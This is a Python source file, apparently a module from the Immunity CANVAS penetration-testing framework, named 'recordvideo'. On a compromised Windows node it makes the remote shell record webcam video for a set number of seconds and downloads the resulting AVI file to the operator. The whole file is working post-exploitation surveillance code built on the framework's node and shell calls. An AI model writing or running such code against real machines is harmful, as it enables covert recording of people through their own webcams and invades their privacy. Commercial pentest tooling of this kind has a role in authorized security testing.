#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from internal import *

from ExploitTypes.localcommand import LocalCommand
import canvasengine
import time
import random
from canvaserror import *
VERSION = "1.0"
NAME="recordvideo"
DESCRIPTION="Record video from a webcam"
DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For commandline use:
MOSDEF\Win32> runmodule recordvideo
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]


from engine.config import canvas_root_directory
class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result   = []
        self.name     = NAME
        self.filename = None
        self.vert     = None
        self.hor      = None
        self.seconds  = "10"

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("recordvideo - "+msg)
        self.setProgress(percent)
        return

    def run(self):
        rv = 0
        self.host = self.target.interface
        self.setInfo("%s (in progress)"%(NAME))
        self.seconds = int( self.argsDict.get("seconds",self.seconds).strip() )

        for node in self.argsDict["passednodes"]:
            type=node.nodetype
            if "win32api" in node.capabilities:
                filename = "tmp-%d" % random.randint(0,50000)
                outputdir = self.output(ip=node.get_interesting_interface(), subdir="Video")
                #I'm assuming this opens the file read-write
                #on windows you need to have writable access
                #Lesson Learned: don't use os.tmpfile() for anything portable.
                #tempoutfile=os.tmpfile()
                self.setProgress(25)
                now  = time.strftime("%m_%d_%Y_%H_%M_%S" , time.localtime())
                ret = node.shell.recordvideo(progr=self.set_progr, seconds = self.seconds, filename = filename)
                self.setProgress(50)
                outfile = outputdir + "/sesion_%s.avi" % now
                ret = node.download(filename, outfile)
                self.setProgress(75)

                msg = "success"
                self.log("Check \"%s\" for the video file" % outputdir)
                rv = 1
            else:
                self.log("Node of type %s not supported yet."%type)
                rv = -1
                msg = "unsupported"

        self.setInfo("%s - done (%s)"%(NAME, msg))
        return rv



if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
